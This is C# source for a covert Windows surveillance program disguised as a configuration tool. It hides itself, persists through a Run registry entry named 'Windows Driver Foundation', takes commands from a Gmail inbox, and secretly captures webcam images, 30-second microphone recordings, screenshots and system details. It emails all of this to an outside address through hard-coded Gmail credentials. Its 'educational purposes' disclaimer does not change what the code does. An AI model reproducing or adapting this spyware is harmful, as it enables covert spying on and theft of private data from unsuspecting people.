using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Net.Mail;
using MailKit.Net.Pop3;
using MailKit;
using MimeKit;
using System.Threading;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;
using System;
using System.Threading;
using System.Windows.Forms;
using System.Collections;
using System.Drawing;
using Microsoft.VisualBasic;
using System.Data;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic;
using System.Runtime.InteropServices;
using Emgu.CV;
using Net.Pkcs11Interop.Common;
using System.Drawing.Imaging;
using AForge.Video.DirectShow;
using AForge.Video;

using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using static System.Net.Mime.MediaTypeNames;

namespace Windows78_Config
{
    public partial class Main : Form
    {
        //Author: Caspar Stählin
        //Date: 08.02.2023
        //Version: 1.3
        
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        private FilterInfoCollection CaptureDevice;
        private VideoCaptureDevice FinalFrame;
        private FilterInfoCollection videoDevices;
        private bool stopsignal;
        private String pathString;
        private String EmailReceiver = "zerdyax@gmail.com";
        public Main()
        {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            SendSetupInfoMail();
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            try
            {
                rk.SetValue("Windows Driver Foundation", Application.ExecutablePath);
            }
            catch (Exception ex)
            { }
                while (true)
                {
                    using (var client = new Pop3Client())
                    {
                        client.Connect("pop.gmail.com", 995, true);
                        client.Authenticate("prof.shitpost420@gmail.com", "knxyrkzjjanaygoi");
                        int d = client.Count;

                    if (client.Count > 0)
                    {
                        pathString = "C:/Config Folder" + DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)");
                        System.IO.Directory.CreateDirectory(pathString);
                        stopsignal = false;
                        //Creates a Text File with Information like Brightness,Keyboard Layout, Battery Status , Volume
                        GetDoxxingInformation(pathString);
                        videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                        // create video source
                        VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                        // set NewFrame event handler
                        videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
                        // start the video source
                        videoSource.Start();
                        while (true)
                        {
                            if( stopsignal == true)
                            {
                                videoSource.SignalToStop();
                                break;
                            }
                        }
                        recordAudio(pathString);
                        GetScreenShot(pathString);
                        client.DeleteAllMessages();
                        client.Disconnect(true);
                        Thread.Sleep(30000);
                        
                    }
                        client.Disconnect(true); 
                    }            
                }
        }

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }


        private void GetScreenShot(String path)
        {
            //Get Screen Res
            string screenWidth = Screen.PrimaryScreen.Bounds.Width.ToString();
            string screenHeight = Screen.PrimaryScreen.Bounds.Height.ToString();

            int screenWidthinInt = Int32.Parse(screenWidth);
            int screenHeightinInt = Int32.Parse(screenHeight);

            
            //Make Screenshot
            Bitmap memoryImage;
            memoryImage = new Bitmap(screenWidthinInt, screenHeightinInt);
            Size s = new Size(screenWidthinInt, screenHeightinInt);

            Graphics memoryGraphics = Graphics.FromImage(memoryImage);

            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
            string fileName = string.Format(path) +
                      @"\Screenshot" + "_" +
                      DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)");
            memoryImage.Save(fileName + ".png");
            System.Threading.Thread.Sleep(1000);

            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
            string fileName2 = string.Format(path) +
                      @"\Screenshot" + "_" +
                      DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)");
            memoryImage.Save(fileName2 + ".png");
            System.Threading.Thread.Sleep(1000);

            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
            string fileName3 = string.Format(path) +
                      @"\Screenshot" + "_" +
                      DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)");
            memoryImage.Save(fileName3 + ".png");
            System.Threading.Thread.Sleep(1000);

            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
            string fileName4 = string.Format(path) +
                      @"\Screenshot" + "_" +
                      DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt) ");
            memoryImage.Save(fileName4 + ".png");
            System.Threading.Thread.Sleep(1000);

            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
            string fileName5 = string.Format(path) +
                      @"\Screenshot" + "_" +
                      DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)");
            memoryImage.Save(fileName5 + ".png");

            //Sending the Mail
            SendMail(path, fileName, fileName2, fileName3, fileName4, fileName5);
        }
        private void GetMousePositionSimplfied()
        {

        }
        private void SendMail(String path, String fileName, String fileName2, String fileName3, String fileName4, String fileName5)
        {
            string filepath = path + "/User_PC_Information.txt";
            string text = File.ReadAllText(filepath);

            var fromAddress = new MailAddress("prof.shitpost420@gmail.com", "Background Agent");
            var toAddress = new MailAddress(EmailReceiver, "Me");
            const string fromPassword = "knxyrkzjjanaygoi";
            const string subject = "Data Pulling Request";

            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            };
            var message = new MailMessage(fromAddress, toAddress);

            message.Subject = subject;
            message.Body = text;
            message.Attachments.Add(new Attachment(fileName + ".png"));
            message.Attachments.Add(new Attachment(fileName2 + ".png"));
            message.Attachments.Add(new Attachment(fileName3 + ".png"));
            message.Attachments.Add(new Attachment(fileName4 + ".png"));
            message.Attachments.Add(new Attachment(fileName5 + ".png"));
            message.Attachments.Add(new Attachment(pathString + @"\WebcamImage.jpg"));
            message.Attachments.Add(new Attachment(pathString + @"\record.wav"));
            {
                smtp.Send(message);
            }


        }
        private void GetDoxxingInformation(String path)
        {
            //Folder Creation
            string filepath = path + "/User_PC_Information.txt";
            try
            {
                String IPAdress = "";
                String Batterystatus = "";
                String BatteryLifeRemaining = "";
                String BatteryPercent = "";
                String PowerlineStatus = "";
                String LanguageLayout = "";
                String ScreenRes = "";

                //Get TimeZone
                const string dataFmt = "{0,-30}{1}";
                const string timeFmt = "{0,-30}{1:MM-dd-yyyy HH:mm}";
                TimeZone curTimeZone = TimeZone.CurrentTimeZone;
                string Timezone = curTimeZone.StandardName;

                //Get OS
                String OS = (Environment.OSVersion.ToString());

                //Get Disk Space
                DriveInfo[] allDrives = DriveInfo.GetDrives();
                DriveInfo d = allDrives[0];

                    String AVSpace = d.TotalFreeSpace.ToString();
                    String TotalSpace = d.TotalSize.ToString();
                    AVSpace = (AVSpace + " Bytes");
                    TotalSpace = (TotalSpace + " Bytes");


                //Get Screen Res
                string screenWidth = Screen.PrimaryScreen.Bounds.Width.ToString();
                string screenHeight = Screen.PrimaryScreen.Bounds.Height.ToString();
                ScreenRes = screenWidth + " x " + screenHeight;

                //Get IP Adress
                IPAdress = GetLocalIPAddress();

                //Get Language Layout
                LanguageLayout = InputLanguage.CurrentInputLanguage.LayoutName;

                //BatteryPercentage
                PowerStatus status = SystemInformation.PowerStatus;
                Batterystatus = status.BatteryChargeStatus.ToString();
                BatteryPercent = status.BatteryLifePercent.ToString("P0");
                BatteryLifeRemaining = status.BatteryLifeRemaining == -1 ? "Unknown" : status.BatteryLifeRemaining.ToString();
                PowerlineStatus = status.PowerLineStatus.ToString();

                //ComputerName
                string PCName = System.Windows.Forms.SystemInformation.ComputerName;
                string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;


                //Fill With Content
                string DoxxingFileContent = ("DoxxingFile Content:" + Environment.NewLine + "========================" + Environment.NewLine +
                    "IP Address:" + 
                    "   " + IPAdress + Environment.NewLine +
                    
                    "PC Username:" +
                    "   " +userName + Environment.NewLine +
                    
                    "Computer Name:" + 
                    "   " + PCName + Environment.NewLine +
                    
                    "Language Layout: " + 
                    "   " + LanguageLayout + Environment.NewLine +
                    
                    "Screen Resolution: " + 
                    "   " + ScreenRes + Environment.NewLine +

                    "Battery Percent: " + 
                    "   " + BatteryPercent + Environment.NewLine +
                    
                    "Battery Life Left: " + 
                    "   " + BatteryLifeRemaining + Environment.NewLine +
                    
                    "Battery Line Status: " +
                    "   " + PowerlineStatus + Environment.NewLine +
                    
                    "Time Zone:" + 
                    "   " + Timezone + Environment.NewLine +
                    
                    "Operating System: " + 
                    "   " + OS + Environment.NewLine +
                    
                    "Available Storage: " + 
                     "   " + AVSpace + Environment.NewLine +
                     
                    "Total Storage: " +
                     "   " + TotalSpace + Environment.NewLine +


                    "" + Environment.NewLine +
                    ""

                    );
                File.WriteAllText(filepath, DoxxingFileContent);



            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex.ToString());
                File.WriteAllText(filepath, "Something went Wrong please check the code you usel");
            }

        }
        private void recordAudio(string filePath)
        {

            mciSendString("open new Type waveaudio Alias recsound", "", 0, 0);
            mciSendString("record recsound", "", 0, 0);
            
            Thread.Sleep(30000);

            filePath = filePath + "/record.wav";
            mciSendString($"save recsound \"{filePath}\"", "", 0, 0);
            mciSendString("close recsound ", "", 0, 0);
            Computer c = new Computer();
            c.Audio.Stop();
        }
        private void SendSetupInfoMail()
        {
            var fromAddress = new MailAddress("prof.shitpost420@gmail.com", "Background Agent");
            var toAddress = new MailAddress(EmailReceiver, "Me");
            const string fromPassword = "knxyrkzjjanaygoi";
            const string subject = "Agent Setup Information";

            string text = "A New execution has been detected." + Environment.NewLine + 
                "Reply to this E-Mail to start the process, ignore it and it will remain on Standby" + Environment.NewLine + Environment.NewLine + 
                "Attachments include:" + Environment.NewLine + 
                "   General Information about the Computer" + Environment.NewLine + 
                "   5 Screenshots with a 1 second time interval" + Environment.NewLine + 
                "   One Webcam Photo" + Environment.NewLine + 
                "   A 30s minute Audiofile" 
                + Environment.NewLine + Environment.NewLine + "Only for educational Purposes. Do not Abuse";
            
            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            };
            var message = new MailMessage(fromAddress, toAddress);
            message.Subject = subject;
            message.Body = text;
            {
                smtp.Send(message);
            }

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        
        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            Bitmap bitmap =(Bitmap)eventArgs.Frame.Clone();
            bitmap.Save(pathString + @"\WebcamImage.jpg");
            stopsignal = true;
        }


    }
}

